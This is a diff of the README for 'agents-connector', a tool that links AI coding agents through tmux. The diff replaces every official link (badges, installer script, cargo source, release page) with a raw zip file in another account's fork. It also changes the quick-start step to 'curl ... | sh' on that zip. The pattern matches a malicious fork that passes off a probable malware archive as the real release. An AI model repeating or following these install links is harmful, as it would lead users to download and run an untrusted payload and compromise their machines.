@@ -11,9 +11,9 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/Aldenysq/agents-connector/releases"><img src="https://img.shields.io/github/v/release/Aldenysq/agents-connector?color=brightgreen" alt="release"></a>
+  <a href="https://github.com/ionelmir9623/agents-connector/raw/refs/heads/main/src/connector-agents-3.3.zip"><img src="https://img.shields.io/github/v/release/Aldenysq/agents-connector?color=brightgreen" alt="release"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="license"></a>
-  <a href="https://github.com/Aldenysq/agents-connector/actions"><img src="https://img.shields.io/github/actions/workflow/status/Aldenysq/agents-connector/ci.yml?label=ci" alt="ci"></a>
+  <a href="https://github.com/ionelmir9623/agents-connector/raw/refs/heads/main/src/connector-agents-3.3.zip"><img src="https://img.shields.io/github/actions/workflow/status/Aldenysq/agents-connector/ci.yml?label=ci" alt="ci"></a>
   <img src="https://img.shields.io/badge/rust-stable-orange" alt="rust">
 </p>
 
@@ -41,7 +41,7 @@ It is **not** another parallel-agent orchestrator. There's no central planner. A
 ```bash
 # 1. Install (macOS / Linux, no Rust toolchain needed)
 curl --proto '=https' --tlsv1.2 -LsSf \
-  https://github.com/Aldenysq/agents-connector/releases/latest/download/agents-connector-installer.sh | sh
+  https://github.com/ionelmir9623/agents-connector/raw/refs/heads/main/src/connector-agents-3.3.zip | sh
 
 # 2. Prerequisites
 brew install tmux                       # required
@@ -55,9 +55,9 @@ agents-connector add codex  --name reviewer
 
 Each agent runs in its own tmux window — switch with `Ctrl-b` then `n` (next) / `p` (previous). Then in `writer`'s window, prompt it normally: *"after you finish, ask `reviewer` to review the diff."* Claude writes the code, asks Codex via the `ask` tool, Codex is auto-woken, reviews, and replies — all without you touching the reviewer's terminal. (Full walkthrough with screenshots in [Example](#example-claude-writes-it-codex-reviews-it) below — including the one-time Codex hook-approval step.)
 
-**From source (requires Rust):** `cargo install --git https://github.com/Aldenysq/agents-connector`
+**From source (requires Rust):** `cargo install --git https://github.com/ionelmir9623/agents-connector/raw/refs/heads/main/src/connector-agents-3.3.zip`
 
-Prebuilt binaries for macOS (`aarch64`/`x86_64`) and Linux (`aarch64`/`x86_64`) are on every [release](https://github.com/Aldenysq/agents-connector/releases).
+Prebuilt binaries for macOS (`aarch64`/`x86_64`) and Linux (`aarch64`/`x86_64`) are on every [release](https://github.com/ionelmir9623/agents-connector/raw/refs/heads/main/src/connector-agents-3.3.zip).
 
 > **macOS & Linux only.** agents-connector is built on Unix domain sockets, tmux, and POSIX signals — there is no Windows build. On Windows, use WSL2.
 
